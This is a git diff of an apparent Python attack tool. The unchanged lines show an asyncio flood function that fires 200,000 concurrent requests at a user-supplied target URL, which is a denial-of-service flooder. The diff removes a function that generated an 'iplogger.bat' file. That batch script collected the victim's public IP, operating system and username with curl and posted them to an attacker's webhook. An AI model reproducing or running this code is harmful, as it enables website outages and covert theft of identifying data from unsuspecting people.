@@ -1,13 +1,14 @@
 import aiohttp
 import asyncio
-import time
 import sys
 import colorama 
 from colorama import Fore
 import os 
 from pystyle import *
 import socket
+
 colorama.init(convert=True, autoreset=True)
+
 
 os.system('cls') if os.name == 'nt' else os.system('clear')
 print(f"""
@@ -63,25 +64,10 @@ async def main():
         tasks = [flood(session, url) for _ in range(200000)] 
         await asyncio.gather(*tasks)
         
-def buildlogger(wb):
-    code = f"""@echo off
-set webhook={wb}
-
-:: GETTING THE IP
-curl ifconfig.co/ > ip.txt
-set /p ip=<ip.txt
-del ip.txt
-
-curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%ip%\\"}}" %webhook%
-curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%os%\\"}}" %webhook%
-curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%username%\\"}}" %webhook%
-
-"""
-    with open('iplogger.bat', 'w', encoding='utf-8') as f:
-        f.write(code)
-    print("[+] ip.logger success")
+if choice not in ['1', '2']:
+    print(f"{Fore.RED}Invalid choice. Please select either 1 or 2.{Fore.RESET}")
+    sys.exit(1)
     
-
 if int(choice) == 1:
     url = str(input('Target URL >> '))
     asyncio.run(main())
